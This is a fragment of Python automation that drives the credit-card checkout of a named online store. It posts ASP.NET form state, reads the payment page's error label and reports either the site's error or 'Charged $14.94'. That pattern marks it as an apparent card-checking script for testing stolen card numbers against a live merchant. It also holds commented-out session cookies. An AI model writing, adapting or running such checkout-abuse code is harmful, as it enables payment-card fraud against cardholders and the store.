    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724436958.59.0.1866174869',
    'origin': 'https://www.bluescentric.com',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/checkoutreview.aspx?paymentmethod=CREDITCARD',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    params = {
    'paymentmethod': 'CREDITCARD',
}

    data = {
    '__EVENTTARGET': 'ctl00$PageContent$btnContinueCheckout2',
    '__EVENTARGUMENT': '',
    '__VIEWSTATE': __viewstate,
    '__VIEWSTATEGENERATOR': __viewstategenerator,
    '__EVENTVALIDATION': __eventvalidation,
    'ctl00$ctrlPageSearch$SearchText': '',
}

    response = r.post('https://www.bluescentric.com/checkoutreview.aspx',params=params,headers=headers,data=data,timeout=50)

    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    # 'cookie': '.ASPXANONYMOUS=iOjrIBMs2wEkAAAANzdkMWU1MzItMjdhOC00YzBjLWE3NGEtZTQzNDRlMDc0Njk3rSNsMKP2nfF_gBJF32P_eprXZJ01; ASP.NET_SessionId=qfpj4bgb2xyye1tjjddrhogk; _gcl_au=1.1.1514992938.1724433864; _ga=GA1.1.1146533386.1724433864; LastViewedSection=0; MasterCatID=0; LastViewedCategory=0; fpestid=G7Xm48WnBeINLrLwVn174S26KCFwpr3-QmzLGzyvC5bgpEUk25ZKRGDQZTOnE5THCLIhag; ASPDNSFGUID=D07EEC7087E2D17E602E364049C0FBA4CB7663A259F995DB6839D12A910FCF63399FA99D735098BF2C7D7ECE0052769D69209DC2CFED3D0987205F9BDB012C15B566DEE08F1EF9A2EF9F88EE1ACF68E96B810C33542B18EC8ED328C82BC3A242315D281530B3880463263085691466672A68CDA2870A52E333C6159C73F8B1C6BE246DF96AA4EA0CE979A6D63271295CC0924297F7DF25EA122AE655FF4F5B20AEB54E2E; _ga_1M2S73KZML=GS1.1.1724433863.1.1.1724436958.59.0.1866174869',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bluescentric.com/checkoutreview.aspx?paymentmethod=CREDITCARD',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    params = {
    'TryToShowPM': 'CREDITCARD',
    'errormsg': '34',
}

    response = r.get('https://www.bluescentric.com/checkoutpayment.aspx', params=params,headers=headers,timeout=50)
    soup = BeautifulSoup(response.text, 'html.parser')
    try:
        err = soup.find('span', {'id': 'ctl00_PageContent_ErrorMsgLabel'}, class_='error')
        if err:
            error_message = err.get_text()
            return error_message
        else:
            return "Charged $14.94"
            
    except Exception as e:
        return f"Error: {str(e)}"